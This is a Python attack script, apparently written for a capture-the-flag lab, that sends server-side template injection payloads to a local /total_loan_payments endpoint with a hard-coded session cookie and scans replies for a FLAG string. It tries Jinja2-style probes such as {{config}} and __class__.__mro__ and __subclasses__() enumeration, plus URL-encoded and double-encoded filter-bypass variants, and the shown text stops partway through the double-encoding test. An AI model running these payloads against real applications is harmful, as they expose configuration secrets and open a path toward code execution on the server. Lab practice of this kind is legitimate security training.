import requests
import urllib.parse
import base64
import re

base_url = "http://127.0.0.1:5000"
endpoint = "/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVYRkA.NZrGBUBLWhE1H3H_nJGpmrxsh5A"

print("[*] SSTI Filter Bypass Test - /total_loan_payments")
print(f"[*] Endpoint: {base_url}{endpoint}")
print("="*60)

cookies = {'session': session_cookie}

# Test 1: Basic connectivity
print("\n[1] Testing basic connectivity...")
try:
    response = requests.get(f"{base_url}{endpoint}", params={'data': 'test'}, cookies=cookies, timeout=5)
    print(f"Status: {response.status_code}, Length: {len(response.text)}")
except Exception as e:
    print(f"Error: {e}")

# Test 2: Raw payloads
print("\n[2] Testing raw SSTI payloads through 'data' parameter...")
raw_payloads = [
    ("calc", "{{7*7}}"),
    ("config", "{{config}}"),
    ("request", "{{request.args}}"),
    ("class_mro", "{{''.__class__.__mro__}}"),
    ("subclasses", "{{''.__class__.__mro__[1].__subclasses__()}}"),
]

for name, payload in raw_payloads:
    try:
        print(f"\nTest: {name}")
        print(f"Payload: {payload}")
        response = requests.get(f"{base_url}{endpoint}", params={'data': payload}, cookies=cookies, timeout=5)
        print(f"Status: {response.status_code}, Length: {len(response.text)}")
        
        # Check for 49 (7*7 result), flag, or config
        has_49 = '49' in response.text
        has_flag = re.search(r'FLAG\{[^}]+\}', response.text)
        
        if has_flag:
            print(f"[!] FLAG FOUND: {has_flag.group(0)}")
        elif has_49:
            print(f"[!] SSTI EXECUTED - Found '49' (7*7=49)")
            print(f"Response: {response.text[:200]}")
        elif len(response.text) < 1000:
            print(f"Response: {response.text[:200]}")
        else:
            print("No obvious execution (large response)")
    except Exception as e:
        print(f"Error: {e}")

# Test 3: URL-encoded payloads
print("\n" + "="*60)
print("[3] Testing URL-encoded payloads...")
url_encoded_payloads = [
    ("calc_url", urllib.parse.quote("{{7*7}}")),
    ("config_url", urllib.parse.quote("{{config}}")),
    ("class_url", urllib.parse.quote("{{''.__class__.__mro__}}")),
]

for name, payload in url_encoded_payloads:
    try:
        print(f"\nTest: {name}")
        print(f"Payload: {payload}")
        response = requests.get(f"{base_url}{endpoint}", params={'data': payload}, cookies=cookies, timeout=5)
        print(f"Status: {response.status_code}, Length: {len(response.text)}")
        
        has_flag = re.search(r'FLAG\{[^}]+\}', response.text)
        if has_flag:
            print(f"[!] FLAG: {has_flag.group(0)}")
        elif '49' in response.text:
            print(f"[!] EXECUTED (49 found)")
    except Exception as e:
        print(f"Error: {e}")

# Test 4: Double URL-encoded
print("\n" + "="*60)
print("[4] Testing double URL-encoded payloads...")
double_encoded = urllib.parse.quote(urllib.parse.quote("{{7*7}}"))
try:
    print(f"Test: calc_double_encoded")
